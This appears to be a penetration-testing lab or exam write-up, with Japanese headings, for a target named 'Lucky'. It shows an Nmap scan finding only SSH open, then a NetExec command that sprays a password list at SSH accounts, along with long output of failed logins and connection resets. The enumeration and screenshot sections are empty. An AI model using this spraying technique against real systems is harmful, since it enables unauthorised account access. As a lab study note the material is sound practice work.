# Nmap

```zsh
PORT   STATE SERVICE REASON  VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0e:84:80:bd:8f:b6:51:7d:c1:87:db:8c:f4:f3:15:9e (RSA)
|   256 8c:98:44:30:1c:37:53:84:32:22:eb:e1:9c:06:68:06 (ECDSA)
|_  256 1b:db:c7:c9:36:54:b8:cf:ff:1a:2f:9a:91:b1:56:e4 (ED25519)
```

---

# Enumeration

---

# Exploit

- 入手した認証情報でスプレー
```sh
┌──(koshi㉿kali)-[~/Exam/Lucky]
└─$ nxc ssh $TargetIP -u usernames.txt -p quoted_passwords.txt --continue-on-success 
SSH         192.168.104.112 22     192.168.104.112  [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] sam:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] sarah:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] nick:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] joe:'Passw0rd'
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'password@1'
SSH         192.168.104.112 22     192.168.104.112  [-] sam:'password@1'
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'password@1'
[22:06:29] ERROR    Internal Paramiko error for sarah:'password@1', Error reading SSH protocol banner[Errno 104] Connection reset by peer         ssh.py:134
[22:06:30] ERROR    Internal Paramiko error for nick:'password@1', Error reading SSH protocol banner[Errno 104] Connection reset by peer          ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'password@1'
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'password@1'
SSH         192.168.104.112 22     192.168.104.112  [-] joe:'password@1'
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'Password1234'
[22:06:46] ERROR    Internal Paramiko error for sam:'Password1234', Error reading SSH protocol banner[Errno 104] Connection reset by peer         ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'Password1234'
[22:06:51] ERROR    Internal Paramiko error for sarah:'Password1234', Error reading SSH protocol banner[Errno 104] Connection reset by peer       ssh.py:134
           ERROR    Internal Paramiko error for nick:'Password1234', Error reading SSH protocol banner[Errno 104] Connection reset by peer        ssh.py:134
[22:06:52] ERROR    Internal Paramiko error for paul:'Password1234', Error reading SSH protocol banner[Errno 104] Connection reset by peer        ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'Password1234'
SSH         192.168.104.112 22     192.168.104.112  [-] joe:'Password1234'
[22:07:01] ERROR    Internal Paramiko error for lee:'Qwerty7', Error reading SSH protocol banner[Errno 104] Connection reset by peer              ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] sam:'Qwerty7'
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'Qwerty7'
SSH         192.168.104.112 22     192.168.104.112  [-] sarah:'Qwerty7'
[22:07:15] ERROR    Internal Paramiko error for nick:'Qwerty7', Error reading SSH protocol banner                                                 ssh.py:134
           ERROR    Internal Paramiko error for paul:'Qwerty7', Error reading SSH protocol banner[Errno 104] Connection reset by peer             ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'Qwerty7'
SSH         192.168.104.112 22     192.168.104.112  [-] joe:'Qwerty7'
[22:07:26] ERROR    Internal Paramiko error for lee:'Covid19', Error reading SSH protocol banner[Errno 104] Connection reset by peer              ssh.py:134
[22:07:27] ERROR    Internal Paramiko error for sam:'Covid19', Error reading SSH protocol banner[Errno 104] Connection reset by peer              ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'Covid19'
SSH         192.168.104.112 22     192.168.104.112  [-] sarah:'Covid19'
SSH         192.168.104.112 22     192.168.104.112  [-] nick:'Covid19'
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'Covid19'
[22:07:49] ERROR    Internal Paramiko error for linda:'Covid19', Error reading SSH protocol banner[Errno 104] Connection reset by peer            ssh.py:134
           ERROR    Internal Paramiko error for joe:'Covid19', Error reading SSH protocol banner[Errno 104] Connection reset by peer              ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'c0r0n@''
SSH         192.168.104.112 22     192.168.104.112  [-] sam:'c0r0n@''
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'c0r0n@''
[22:08:03] ERROR    Internal Paramiko error for sarah:'c0r0n@'', Error reading SSH protocol banner[Errno 104] Connection reset by peer            ssh.py:134
[22:08:04] ERROR    Internal Paramiko error for nick:'c0r0n@'', Error reading SSH protocol banner[Errno 104] Connection reset by peer             ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'c0r0n@''
[22:08:08] ERROR    Internal Paramiko error for linda:'c0r0n@'', Error reading SSH protocol banner[Errno 104] Connection reset by peer            ssh.py:134
           ERROR    Internal Paramiko error for joe:'c0r0n@'', Error reading SSH protocol banner[Errno 104] Connection reset by peer              ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'L0ckD0wn2020'
SSH         192.168.104.112 22     192.168.104.112  [-] sam:'L0ckD0wn2020'
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'L0ckD0wn2020'
[22:08:22] ERROR    Internal Paramiko error for sarah:'L0ckD0wn2020', Error reading SSH protocol banner                                           ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] nick:'L0ckD0wn2020'
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'L0ckD0wn2020'
[22:08:30] ERROR    Internal Paramiko error for linda:'L0ckD0wn2020', Error reading SSH protocol banner                                           ssh.py:134
           ERROR    Internal Paramiko error for joe:'L0ckD0wn2020', Error reading SSH protocol banner                                             ssh.py:134
[22:08:31] ERROR    Internal Paramiko error for lee:'Million2', Error reading SSH protocol banner[Errno 104] Connection reset by peer             ssh.py:134
           ERROR    Internal Paramiko error for sam:'Million2', Error reading SSH protocol banner                                                 ssh.py:134
[22:08:32] ERROR    Internal Paramiko error for simon:'Million2', Error reading SSH protocol banner                                               ssh.py:134
           ERROR    Internal Paramiko error for sarah:'Million2', Error reading SSH protocol banner[Errno 104] Connection reset by peer           ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] nick:'Million2'
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'Million2'
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'Million2'
[22:08:50] ERROR    Internal Paramiko error for joe:'Million2', Error reading SSH protocol banner[Errno 104] Connection reset by peer             ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] lee:'aaron431'
[22:08:56] ERROR    Internal Paramiko error for sam:'aaron431', Error reading SSH protocol banner                                                 ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'aaron431'
SSH         192.168.104.112 22     192.168.104.112  [-] sarah:'aaron431'
[22:09:06] ERROR    Internal Paramiko error for nick:'aaron431', Error reading SSH protocol banner[Errno 104] Connection reset by peer            ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'aaron431'
[22:09:10] ERROR    Internal Paramiko error for linda:'aaron431', Error reading SSH protocol banner[Errno 104] Connection reset by peer           ssh.py:134
           ERROR    Internal Paramiko error for joe:'aaron431', Error reading SSH protocol banner[Errno 104] Connection reset by peer             ssh.py:134
[22:09:11] ERROR    Internal Paramiko error for lee:'!Password-Reset0000', Error reading SSH protocol banner                                      ssh.py:134
           ERROR    Internal Paramiko error for sam:'!Password-Reset0000', Error reading SSH protocol banner[Errno 104] Connection reset by peer  ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] simon:'!Password-Reset0000'
[22:09:16] ERROR    Internal Paramiko error for sarah:'!Password-Reset0000', Error reading SSH protocol banner                                    ssh.py:134
           ERROR    Internal Paramiko error for nick:'!Password-Reset0000', Error reading SSH protocol banner[Errno 104] Connection reset by peer ssh.py:134
SSH         192.168.104.112 22     192.168.104.112  [-] paul:'!Password-Reset0000'
SSH         192.168.104.112 22     192.168.104.112  [-] linda:'!Password-Reset0000'
[22:09:25] ERROR    Internal Paramiko error for joe:'!Password-Reset0000', Error reading SSH protocol banner[Errno 104] Connection reset by peer  ssh.py:134
                           

```

---

# Screenshot


